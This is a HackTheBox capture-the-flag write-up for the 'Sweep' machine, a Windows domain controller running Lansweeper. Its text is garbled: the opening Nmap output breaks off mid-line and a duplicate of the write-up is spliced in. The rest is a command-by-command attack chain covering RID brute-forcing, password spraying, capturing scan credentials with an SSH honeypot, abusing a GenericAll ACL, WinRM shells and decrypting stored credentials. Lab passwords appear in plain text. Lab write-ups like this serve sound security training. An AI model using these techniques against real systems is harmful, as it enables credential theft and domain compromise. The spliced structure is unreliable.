---
icon: broom-wide
---

# HTB-SWEEP (VL)

<figure><img src="../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

### Initial Reconnaissance

#### Nmap Scanning

```bash
nmap -sC -sV -oA nmap/sweep 10.129.234.177
```

**Output:**

````
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 11:20 EST
Nmap scan report for 10.129.234.177
Host is up (0.042s latency).
Not shown: 988 filtered tcp ports (no-responses)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
81/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lansweeper
82/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-15 16:21:02Z)
135/tcp  open  msrpc         # HTB Sweep Machine - Complete Writeup

## Machine Information
- **Machine Name**: Sweep
- **Platform**: HackTheBox
- **IP Address**: 10.129.234.177
- **Domain**: sweep.vl
- **Hostname**: INVENTORY.sweep.vl
- **Difficulty**: Medium (VIP+)
- **OS**: Windows Server 2022 (Domain Controller)
- **Key Technology**: Lansweeper (IT Asset Management)

---

## Machine Overview

Sweep is a medium difficulty Windows box involving **Active Directory** and **Lansweeper** (a technology asset intelligence tool). The attack chain involves:
- Abusing enabled guest account to gain Lansweeper access
- Exploiting Map Credentials configuration for credential interception
- Deploying SSH honeypot to capture stored credentials
- Leveraging AD group permissions (GenericAll ACL)
- Escalating through Lansweeper credential decryption

---

## Initial Reconnaissance

### Nmap Scanning
```bash
nmap -sC -sV -oA nmap/sweep 10.129.234.177
````

**Results**: Windows Server 2022 DC with Lansweeper exposed on ports 81/82

***

### SMB Enumeration

#### Generating /etc/hosts File

```bash
nxc smb 10.129.234.177 -u '' -p '' --generate-hosts-file /etc/hosts
```

**Result**: Auto-populated hosts file with domain information

#### SMB Share Enumeration as Guest

```bash
smbmap -H 10.129.234.177 -d 'sweep.vl' -u 'guest' -p ''
```

**Discovery**: Found 2 additional shares beyond standard shares:

* **Lansweeper$** 📂
* **DefaultPackageShare$** 📂

#### Accessing DefaultPackageShare Anonymously

```bash
smbclient //10.129.234.177/DefaultPackageShare$ -N
```

**Contents Found**:

* 1 Image file
* 3 Visual Basic Script (.vbs) files:

**Script Analysis**:

1. **Wallpaper.vbs**: Copies file to destination and sets as Windows desktop wallpaper
2. **CopyFile.vbs**: Copies files from source to destination, handles read-only files
3. **CmpDesc.vbs**: Reads system serial/model and sets server description in registry

***

### User Enumeration & Authentication

#### RID Brute Force Attack

```bash
nxc smb 10.129.234.177 -u guest -p '' --rid-brute
```

#### User Extraction

```bash
nxc smb 10.129.234.177 -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

#### Username=Password Spray

```bash
nxc smb 10.129.234.177 -u 'users.txt' -p 'users.txt' --continue-on-success --no-brute
```

**SUCCESS**: Found valid credentials - `[+] sweep.vl\intern:intern` ✅

***

### SMB Access with Valid Credentials

#### Re-enumerating Shares as Intern

```bash
smbmap -H 10.129.234.177 -d 'sweep.vl' -u 'intern' -p 'intern'
```

#### Accessing Lansweeper Share

```bash
smbclient -U sweep/intern '//inventory.sweep.vl/Lansweeper$'
```

**Result**: Gained access to Lansweeper files, performed reconnaissance but found no immediate secrets

***

### Lansweeper Web Interface Access

#### Lansweeper Discovery

**URL**: `http://inventory.sweep.vl:81` **Credentials**: `intern:intern` 🔑

<figure><img src="../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

**About Lansweeper**: Network discovery and IT asset management tool that automatically detects devices, collects inventory data (hardware, software, users, OS, configurations), and provides central web dashboard for administration.

#### Lansweeper Configuration Analysis

<figure><img src="../../../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

**Scanning Credentials Section**

* Accessed: `http://inventory.sweep.vl:81/Scanning/ScanningMethods/`
* **Discovery**: Scanning configuration contains predefined credentials
* **Issue**: Unable to view credentials directly in edit function

**Scanning Targets Configuration**

1. Navigated to **Scanning Targets** → **Add Scanning Target**
2. Selected **IP Range** and inserted HTB VPN IP
3. Target now appears in scan list

**Credential Mapping Process**

1. In **Scanning credentials** section, selected **Map Credential**
2. Chose IP range and **enabled all credentials**
3. Only **'Inventory Linux'** credential was relevant
4. Successfully linked credentials to scan target

***

### Credential Interception with SSH Honeypot

#### Installing Sshesame Honeypot

```bash
apt install sshesame
```

**About Sshesame**: SSH honeypot that emulates SSH service and logs all authentication attempts and commands, allowing credential capture and activity monitoring.

#### Honeypot Configuration

```bash
wget -qO sshesame.conf https://github.com/jaksi/sshesame/raw/master/sshesame.yaml
```

**Configuration File** (`sshesame.conf`):

```yaml
server:
  listen_address: 10.10.14.193:2022  # Port 2022 (HTB blocks 22)
  host_keys: null
  tcpip_services:
    25: SMTP
    80: HTTP
    110: POP3
    587: SMTP
    8080: HTTP

logging:
  file: null
  json: false
  timestamps: true
  debug: false
  metrics_address: null
  # split_host_port: false  # REMOVE THIS LINE (Line 37 - causes error)

auth:
  no_auth: false
```

**Important Configuration Notes**:

* SSH configured on port **2022** (HTB VPN blocks port 22)
* Disabled scheduled runs for manual execution
* **Bug Fix**: Must remove `split_host_port: false` from line 37 to avoid error

#### Launching Sshesame

```bash
sshesame --config sshesame.conf
```

#### Triggering Lansweeper Scan

1. Clicked **'Scan now'** in Lansweeper interface
2. Scan added to queue
3. After few minutes, traffic appeared in sshesame

**CREDENTIAL CAPTURE SUCCESS**:

```
User: svc_inventory_lnx
Password: 0|5m-U6?/uAX
```

#### Credential Validation

```bash
nxc smb inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

**Result**: Valid credentials confirmed! ✅

***

### BloodHound Domain Enumeration

#### Data Collection

```bash
bloodhound-python -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX' -d 'sweep.vl' -c All -ns 10.129.234.177 --dns-tcp --zip
```

#### Key Findings

**Critical AD Permissions Chain**:

1. **svc\_inventory\_lnx** is member of **Lansweeper Discovery** group
2. **Lansweeper Discovery** group has **GenericAll** permissions on **Lansweeper Admins** group
3. **Lansweeper Admins** group is member of **Remote Management Users** group

<figure><img src="../../../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

**Attack Path**: GenericAll → Add to Lansweeper Admins → WinRM Access

***

### Privilege Escalation - Path 1 (Group Manipulation)

#### Adding User to Lansweeper Admins Group

```bash
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' add groupMember "Lansweeper Admins" svc_inventory_lnx
```

#### Gaining WinRM Access

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

**Success**: WinRM shell established!

#### User Flag Capture

```cmd
type c:\user.txt
```

**User flag captured!**

***

### Privilege Escalation - Path 2 (Credential Decryption)

#### Lansweeper Directory Analysis

```cmd
cd 'C:\Program Files (x86)\Lansweeper'
cat Website\web.config
```

**Discovery**: Found web.config file with encrypted sensitive values

#### SharpLansweeperDecrypt Tool

```bash
git clone https://github.com/Yeeb1/SharpLansweeperDecrypt.git
```

**About Tool**: Extracts connection strings and decrypts stored Lansweeper credentials

#### Credential Decryption Process

```cmd
cd C:\Windows\Tasks
upload LansweeperDecrypt.ps1
.\LansweeperDecrypt.ps1
```

**SUCCESS**: Extracted credentials for `svc_inventory_win` account ✅

```
Username: svc_inventory_win
Password: 4^56!sK&}eA?
```

**Key Finding**: `svc_inventory_win` is member of **Administrators** group

***

### Full System Compromise

#### Administrator Access

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
```

#### Root Flag Capture

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured!**

***

### Quick Attack Chain

```
Guest → intern:intern → Lansweeper → SSH Honeypot → svc_inventory_lnx → GenericAll → WinRM → Config Decrypt → svc_inventory_win → Administrator
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
